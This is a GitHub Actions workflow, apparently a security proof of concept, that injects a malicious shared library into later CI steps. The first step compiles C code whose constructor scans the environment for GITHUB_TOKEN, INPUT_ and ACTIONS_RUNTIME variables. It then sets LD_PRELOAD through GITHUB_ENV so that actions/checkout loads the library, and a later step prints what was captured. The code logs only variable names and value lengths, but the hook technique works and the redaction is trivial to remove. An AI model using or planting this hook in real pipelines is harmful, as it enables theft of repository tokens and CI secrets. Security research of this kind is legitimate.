name: BASH_ENV Injection Test
on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  capture-token:
    runs-on: ubuntu-latest
    steps:
      - name: Step 1 — compile .so that captures INPUT_ vars and set LD_PRELOAD
        run: |
          cat > /tmp/capture.c << 'CEOF'
          #include <stdlib.h>
          #include <stdio.h>
          #include <string.h>
          extern char **environ;
          __attribute__((constructor))
          void init(void) {
              FILE *f = fopen("/tmp/captured_env.txt", "a");
              if (!f) return;
              // Scan ALL env vars for token-like values
              for (char **env = environ; *env; env++) {
                  if (strstr(*env, "INPUT_") == *env ||
                      strstr(*env, "GITHUB_TOKEN") == *env ||
                      strstr(*env, "ACTIONS_RUNTIME") == *env) {
                      // Write key name only (redact values for safety)
                      char *eq = strchr(*env, '=');
                      if (eq) {
                          int keylen = eq - *env;
                          int vallen = strlen(eq+1);
                          fprintf(f, "%.*s=(%d chars)\n", keylen, *env, vallen);
                      }
                  }
              }
              fprintf(f, "---CONSTRUCTOR_RAN---\n");
              fclose(f);
          }
          CEOF
          gcc -shared -fPIC -o /tmp/capture.so /tmp/capture.c
          echo "LD_PRELOAD=/tmp/capture.so" >> $GITHUB_ENV
          echo "Step 1: .so compiled and LD_PRELOAD set"

      - name: Step 2 — checkout (Node.js action, gets INPUT_TOKEN)
        uses: actions/checkout@v4

      - name: Step 3 — check what the .so captured from checkout's process
        run: |
          echo "=== Captured env vars from LD_PRELOAD constructor ==="
          if [ -f /tmp/captured_env.txt ]; then
            cat /tmp/captured_env.txt
            echo ""
            echo "Lines containing INPUT_TOKEN or GITHUB_TOKEN:"
            grep -c "INPUT_TOKEN\|INPUT_GITHUB\|GITHUB_TOKEN" /tmp/captured_env.txt || echo "0"
            grep "INPUT_TOKEN\|INPUT_GITHUB\|GITHUB_TOKEN" /tmp/captured_env.txt || echo "(none)"
          else
            echo "No capture file found"
          fi
